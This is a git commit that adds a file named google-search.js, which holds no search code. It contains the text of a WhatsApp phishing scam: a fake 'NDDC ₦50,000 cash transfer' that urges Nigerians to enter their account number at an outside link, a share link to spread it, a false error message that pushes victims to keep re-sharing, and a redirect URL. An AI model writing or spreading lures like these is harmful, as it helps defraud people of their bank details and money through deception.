aea8b860bedfdebab03ad7e1c1bb73a7961b6012
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-08 14:12:00 +0100

    Create google-search.js

---
+++ google-search.js
@@ -0,0 +1,8 @@
+ var text1 ="*NDDC ₦50,000 ANNIVERSARY CELEBRATION CASH TRANSFER*%0A%0AAt 25 Years of making a difference NDDC is giving out ₦50,000 Cash Transfer to Nigerians%0A%0A _Hurry Now and Apply to receive ₦50,000 From NDDC_%0A%0A *Enter your account number here*👇%0A https://ghrant.org/nddc%0A%0A*APPLY HERE*👇%0A https://ghrant.org/nddc %0A%0AN.B: SHARE WITH OTHER NIGERIAN YOUTHS LET THEM ALL BENEFIT FROM THE *NDDC AT 25*",
+        
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "http://outrotomr.com/4/3144603",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
